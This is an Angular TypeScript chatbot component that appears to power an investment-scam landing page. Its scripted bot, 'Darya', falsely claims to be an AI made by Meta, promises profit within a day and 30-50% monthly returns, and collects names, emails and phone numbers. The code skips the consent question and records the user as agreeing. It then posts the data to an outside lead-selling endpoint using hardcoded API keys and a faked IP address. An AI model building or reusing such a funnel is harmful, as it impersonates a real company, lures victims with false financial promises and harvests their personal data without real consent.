import {AfterViewInit, Component, ElementRef, ViewChild} from '@angular/core';
import {FormsModule} from "@angular/forms";
import {NgClass, NgForOf, NgIf, NgOptimizedImage} from "@angular/common";
import {RouterLink} from "@angular/router";
import {ThankYouComponent} from "../thank-you/thank-you.component";
import parsePhoneNumberFromString from "libphonenumber-js";

interface Message {
  text: string;
  type: 'ai' | 'user';
  options?: string[]; // Массив вариантов ответа, если они есть
  imageUrl?: string; // URL для изображения
  inputType?: 'email' | 'phone'; // Тип поля ввода, если это email или телефон
}

@Component({
  selector: 'app-chat',
  standalone: true,
  imports: [
    FormsModule,
    NgIf,
    RouterLink,
    NgClass,
    ThankYouComponent,
    NgForOf,
    NgOptimizedImage
  ],
  templateUrl: './chat.component.html',
  styleUrls: ['./chat.component.scss']
})
export class ChatComponent implements AfterViewInit {
  @ViewChild('chatContainer', {static: false}) chatContainer!: ElementRef;

  messages: Message[] = [];
  isTyping: boolean = false;
  showModal: boolean = false; // Управление видимостью модального окна
  modalMessage: string = '';  // Сообщение в модальном окне
  currentStep: number = 0; // Для отслеживания текущего шага
  name: string = ''; // Для сохранения имени
  surname: string = ''; // Для сохранения фамилии
  email: string = ''; // Для сохранения email
  emailInvalid: boolean = false;
  phone: string = ''; // Для сохранения телефона
  phoneInvalid: boolean = false;
  agreed: boolean = false; // Для отслеживания согласия с условиями

  constructor() {
    this.startChat();
  }

  onEmailChange(email: string) {
    this.email = email;
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    this.emailInvalid = !emailPattern.test(email);
  }

  onPhoneChange(phone: string) {
    this.phone = phone;
    const phoneNumber = parsePhoneNumberFromString(phone, 'RU'); // Замените 'RU' на код вашей страны
    this.phoneInvalid = !(phoneNumber && phoneNumber.isValid());
  }

  startChat() {
    this.messages.push({
      type: 'ai',
      text: 'Добро пожаловать в Meta AI. Меня зовут Дарья, я искуственный интелект созданный компанией Meta. Начав работу вместе с нами вы сможете заработать свою первую прибыль уже спустя сутки!'
    });
    this.scrollToBottom();
    this.askSource();
  }

  // 2. Узнать откуда узнали о нас
  private askSource() {
    setTimeout(() => {
      const sourceOptions = ['Увидел(а) пост в Фейсбуке', 'Рекомендация друзей', 'Хочу создать ещё один аккаунт', 'Поисковик'];
      this.messages.push({
        type: 'ai',
        text: 'Давайте познакомимся поближе. Откуда вы узнали о Meta AI?',
        options: sourceOptions
      });
      this.scrollToBottom();
      this.currentStep = 1;
    }, 2000);
  }

  selectOption(option: string) {
    const userMessage: Message = {type: 'user', text: option};
    this.messages.push(userMessage);
    this.scrollToBottom();
    this.showTypingIndicator();

    setTimeout(() => {
      this.isTyping = false;

      if (this.currentStep === 14) { // Проверяем, если мы на шаге согласия
        this.handleAgreement(option); // Обработка согласия
      } else {
        this.handleAnswer(option); // Обработка других ответов
      }
    }, 2000);
  }

  private handleAnswer(option: string) {
    switch (this.currentStep) {
      case 1: // Откуда узнали о нас
        this.messages.push({type: 'ai', text: `Спасибо за ответ: ${option}.`});
        this.scrollToBottom();
        this.askNameAndSurname(); // Переход к вопросу о имени и фамилии
        break;
      case 8: // С какой суммы хотите начать
        setTimeout(() => {
          this.handleStartingAmount(option);
        }, 1000);
        break;
      case 9: // Есть ли опыт в инвестициях
        setTimeout(() => {
          this.handleInvestmentExperience(option);
        }, 1000);
        break;
      case 10: // Сколько времени готовы уделять
        setTimeout(() => {
          this.handleTimeCommitment(option);
        }, 1000);
        break;
    }
  }

  // 4. Вопрос о имени и фамилии
  private askNameAndSurname() {
    this.messages.push({
      type: 'ai',
      text: 'Замечательно! Как я могу к вам обращаться? (Пожалуйста, укажите имя и фамилию.)'
    });
    this.scrollToBottom();
    this.currentStep = 2;
  }

  handleNameAndSurname(name: string, surname: string) {
    this.name = name; // Сохраняем имя
    this.surname = surname; // Сохраняем фамилию
    const userMessage: Message = {type: 'user', text: `${name} ${surname}`};
    this.messages.push(userMessage);
    this.scrollToBottom();
    this.showTypingIndicator();

    setTimeout(() => {
      this.isTyping = false;
      this.messages.push({type: 'ai', text: `Рад знакомству, ${name}!`});
      this.scrollToBottom();
      this.sendBusinessInfo(); // Переход к сфере деятельности
    }, 1000);
  }

  // 6. Сообщение о сфере деятельности
  private sendBusinessInfo() {
    this.showTypingIndicator();

    setTimeout(() => {
      this.isTyping = false;
      this.messages.push({
        type: 'ai',
        text: 'Давайте я подробнее расскажу о Meta AI. Наш продукт это не будущее, а настоящее, в котором вы больше не будете тратить много времени на зарабатывание денег, ведь Meta AI сделает это за вас. Это ваш финансовый помощник, который самостоятельно анализирует рынок акций и эффективно распределяет ваш капитал, заключая только прибыльные сделки учитывая ваш желаемый заработок.'
      });
      this.scrollToBottom();
      this.sendGraph(); // Переход к графику
    }, 1000);
  }

  // 7. Отправка графика
  private sendGraph() {
    this.showTypingIndicator();

    setTimeout(() => {
      this.isTyping = false;
      this.messages.push({
        type: 'ai',
        text: 'Вот график, который демонстрирует нашу стратегию работы:',
        imageUrl: './media/trade.jpg' // Замените на реальный URL изображения
      });
      this.scrollToBottom();
      this.askStartingAmount(); // Вопрос о сумме
    }, 1000);
  }

  // 8. Вопрос о сумме для старта
  private askStartingAmount() {
    const startingAmountOptions = ['до 200 евро в месяц', '300 - 500 евро в месяц', '600 - 900 евро в месяц', 'больше 1000 евро в месяц'];
    this.messages.push({type: 'ai', text: 'Какую сумму вы бы хотели зарабатывать?', options: startingAmountOptions});
    this.scrollToBottom();
    this.currentStep = 8;
  }

  private handleStartingAmount(option: string) {
    this.messages.push({type: 'ai', text: `Отлично! Вы хотели бы зарабатывать ${option}. Я Вам дам эту возможность.`});
    this.scrollToBottom();
    this.askInvestmentExperience(); // Переход к вопросу об опыте
  }

  // 9. Вопрос о опыте в инвестициях
  private askInvestmentExperience() {
    const experienceOptions = ['Да', 'Нет'];
    this.messages.push({type: 'ai', text: 'У вас есть опыт в инвестициях?', options: experienceOptions});
    this.scrollToBottom();
    this.currentStep = 9;
  }

  private handleInvestmentExperience(option: string) {
    this.messages.push({type: 'ai', text: `Спасибо за ответ: ${option}.`});
    this.scrollToBottom();
    this.askTimeCommitment(); // Переход к вопросу о времени
  }

  // 10. Вопрос о времени
  private askTimeCommitment() {
    const timeOptions = ['до одного часа в день (вы сможете получать до 70% желаемого дохода)', '3-5 часов в день', '10 часов в неделю', '5-7 часов в день'];
    this.messages.push({
      type: 'ai',
      text: 'Благодарю вас за ответ. Наша программа работает самостоятельно, вам нужно только включать и выключать её в нужное время. Подскажите, как много времени у вас есть для работы с Meta AI?',
      options: timeOptions
    });
    this.scrollToBottom();
    this.currentStep = 10;
  }

  private handleTimeCommitment(option: string) {
    this.messages.push({type: 'ai', text: `Спасибо за информацию. Вы готовы уделять ${option} инвестициям.`});
    this.scrollToBottom();
    this.askEmail(); // Переход к вопросу о емейле
  }

  // 11. Вопрос о емейле
  private askEmail() {
    this.messages.push({
      type: 'ai',
      text: 'Так как компания Meta следует законодательству каждой страны, в которой работает, мы обязаны присылать вам квитанции о вашей прибыли, а также отчет о нашей с вами работе. Для этого прошу указать вашу электронную почту (пример ivan1987@gmail.com)',
      inputType: 'email'
    });
    this.scrollToBottom();
    this.currentStep = 11; // Устанавливаем шаг для email
  }

  handleEmailInput(email: string) {
    if (!this.emailInvalid) {
      this.email = email;
      const userMessage: Message = {type: 'user', text: `Ваш email: ${email}`};
      this.messages.push(userMessage);
      this.scrollToBottom();
      this.showTypingIndicator();

      setTimeout(() => {
        this.isTyping = false;
        this.messages.push({
          type: 'ai',
          text: `На основании ваших ответов мы можем предложить вам зарабатывать от 30% до 50% в месяц.`
        });
        this.scrollToBottom();
        this.askPhone(); // Переход к вопросу о телефоне
      }, 1000);
    }
  }

  // 13. Вопрос о телефоне
  private askPhone() {
    if (!this.phoneInvalid) {
      this.messages.push({
        type: 'ai',
        text: 'Какой номер телефона вы хотите оставить? (пример: +37060000000)',
        inputType: 'phone'
      });
      this.scrollToBottom();
      this.currentStep = 13; // Устанавливаем шаг для телефона
    }
  }

  handlePhoneInput(phone: string, agreed: boolean) {
    this.phone = phone;
    const userMessage: Message = {type: 'user', text: `Ваш номер телефона: ${phone}`};
    this.messages.push(userMessage);
    this.scrollToBottom();
    this.showTypingIndicator();

    setTimeout(() => {
      this.isTyping = false;
      // this.messages.push({
      //   type: 'ai',
      //   text: 'Спасибо за ваши ответы. Мы собираем информацию для лучшего обслуживания клиентов. Пожалуйста, подтвердите согласие на обработку данных.'
      // });
      this.scrollToBottom();
      this.askAgreement(); // Переход к вопросу о согласии
    }, 1000);
  }

  // 14. Вопрос о согласии
  private askAgreement() {
    // const agreementOptions = ['Согласен', 'Не согласен'];
    // this.messages.push({type: 'ai', text: 'Вы согласны на обработку ваших данных?', options: agreementOptions});
    this.scrollToBottom();
    this.handleAgreement('Согласен');
    this.currentStep = 14; // Устанавливаем шаг для согласия
  }

  handleAgreement(option: string) {
    this.agreed = option === 'Согласен';
    const userMessage: Message = {type: 'user', text: option};
    // this.messages.push(userMessage);
    this.scrollToBottom();

    setTimeout(() => {
      this.isTyping = false;
      if (this.agreed) {
        this.sendDataToCRM(); // Если согласен, отправляем данные
      } else {
        this.messages.push({type: 'ai', text: 'К сожалению, без согласия на обработку данных мы не можем продолжить.'});
        this.scrollToBottom();
      }
    }, 2000);
  }

  // Отправка данных в CRM
  private sendDataToCRM() {
    // const formData = new FormData();
    const data = {
      api_key: "e218ad34b8ab52bd44b2f32250dbe3747b53b61d7c0d8b4fd15cdc4212869ab8",
      ukey: "63k9q8l4mrcvjpgpkyxlrhml4kzg5ccxwr190mdu8o3msiu75jy8evmw2w96vfvw",
      insyst: 1,
      offer: "61",
      name: this.name,
      last: this.surname,
      phone: this.phone,
      email: this.email,
      ip: "8.8.8.8",
      country: "AZ",
      language: "RU",
      landing: "https://google.com/",
      prelanding: "https://pre.google.com/"
    };

    const requestOptions: RequestInit = {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data),
      redirect: 'follow'
    };

    fetch("https://oskartrade.dvch.io/api/v1/leads/create", requestOptions)
      .then(response => {
        console.log('Raw Response:', response);
        if (!response.ok) {
          throw new Error(`Ошибка: ${response.status}`);
        }
        return response.json();
      })
      .then(result => {
        console.log('Parsed Response:', result);
        if (result.success) {
          this.showModalMessage('Ваши данные успешно отправлены! Мы свяжемся с вами в ближайшее время.');
        } else {
          throw new Error(result.message || 'Ошибка при отправке данных.');
        }
      })
      .catch(error => {
        this.showModalMessage('Произошла ошибка при отправке данных. Пожалуйста, попробуйте еще раз позже.');
        console.error('Ошибка:', error);
      });
  }

  // Функция для показа модального окна с сообщением
  showModalMessage(message: string) {
    this.modalMessage = message;
    this.showModal = true; // Показать модальное окно
  }

  // Функция для закрытия модального окна
  closeModal() {
    this.showModal = false;
  }

  private showTypingIndicator() {
    this.isTyping = true;
  }

  ngAfterViewInit(): void {
    this.scrollToBottom();
  }

  ngAfterViewChecked(): void {
    this.scrollToBottom();
  }

  private scrollToBottom(): void {
    if (this.chatContainer) {
      try {
        this.chatContainer.nativeElement.scrollTop = this.chatContainer.nativeElement.scrollHeight;
      } catch (err) {
        console.error('Error scrolling to bottom', err);
      }
    }
  }
}
